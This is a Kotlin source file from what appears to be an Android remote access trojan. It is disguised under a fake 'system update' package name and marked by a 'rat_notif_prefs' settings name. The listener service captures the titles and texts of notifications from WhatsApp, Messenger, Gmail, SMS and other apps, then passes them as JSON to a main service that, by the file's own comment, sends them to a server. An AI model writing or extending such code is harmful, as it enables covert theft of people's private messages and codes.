package com.android.system.update.services

import android.annotation.SuppressLint
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.content.Intent
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

/**
 * Captures device notifications in real-time and sends them to the server.
 * Requires notification access permission enabled in system settings.
 */
@SuppressLint("OverrideAbstract")
class NotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "NotificationListener"
        private const val PREFS_NAME = "rat_notif_prefs"
        private const val KEY_ACTIVE = "notification_listener_active"
        
        // Categories to always capture regardless of app
        private val PRIORITY_PACKAGES = listOf(
            "com.whatsapp",
            "com.facebook.orca",
            "com.twitter.android",
            "com.instagram.android",
            "com.google.android.gm",
            "com.google.android.apps.messaging",
            "com.samsung.android.messaging",
            "com.android.mms",
            "com.android.vending",
            "com.google.android.youtube"
        )
    }

    private var lastNotificationSent = 0L
    private val minIntervalBetweenSends = 2000L // 2 seconds minimum between sends

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "NotificationListener created")
    }

    override fun onListenerConnected() {
        Log.d(TAG, "Notification listener connected")
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_ACTIVE, true)
            .apply()
    }

    override fun onListenerDisconnected() {
        Log.d(TAG, "Notification listener disconnected")
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_ACTIVE, false)
            .apply()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val now = System.currentTimeMillis()
            if (now - lastNotificationSent < minIntervalBetweenSends) return
            lastNotificationSent = now

            val notification = extractNotification(sbn)
            if (notification == null) {
                Log.d(TAG, "Skipping null notification")
                return
            }

            // Send to MainService via broadcast
            val intent = Intent("com.android.system.update.NOTIFICATION_CAPTURED")
            intent.setPackage(packageName)
            intent.putExtra("notification_json", notification.toString())
            sendBroadcast(intent)
            
            Log.d(TAG, "Notification captured: ${sbn.packageName}")
        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Could track notification dismissal, but not needed for now
    }

    private fun extractNotification(sbn: StatusBarNotification): JSONObject? {
        try {
            val notification = sbn.notification ?: return null
            val extras = notification.extras ?: return null
            
            val title = extras.getString(android.app.Notification.EXTRA_TITLE, "")
            val text = extras.getString(android.app.Notification.EXTRA_TEXT, "")
            val summaryText = extras.getString(android.app.Notification.EXTRA_SUMMARY_TEXT, "")
            val subText = extras.getString(android.app.Notification.EXTRA_SUB_TEXT, "")
            val bigText = extras.getString(android.app.Notification.EXTRA_BIG_TEXT, "")
            
            // Skip empty/system notifications
            if (title.isEmpty() && text.isEmpty() && bigText.isEmpty()) return null
            
            // Skip if the text is too generic (system noise)
            val fullText = "$title $text $bigText $summaryText".trim()
            if (fullText.length < 3) return null
            
            val timestamp = sbn.postTime
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            val dateStr = dateFormat.format(Date(timestamp))

            val notificationObj = JSONObject().apply {
                put("packageName", sbn.packageName)
                put("tag", sbn.tag ?: "")
                put("id", sbn.id)
                put("title", title)
                put("text", text)
                put("bigText", bigText)
                put("summaryText", summaryText)
                put("subText", subText)
                put("timestamp", timestamp)
                put("date", dateStr)
                put("isOngoing", notification.flags and android.app.Notification.FLAG_ONGOING_EVENT != 0)
                put("isGroup", notification.flags and android.app.Notification.FLAG_GROUP_SUMMARY != 0)
                put("category", notification.category ?: "")
                put("priority", notification.priority)
                
                // isGroupConversation is not available at compile time with this SDK level
                put("isGroupConversation", false)
                put("key", sbn.key)
            }
            
            return notificationObj
        } catch (e: Exception) {
            Log.e(TAG, "extractNotification error: ${e.message}")
            return null
        }
    }
}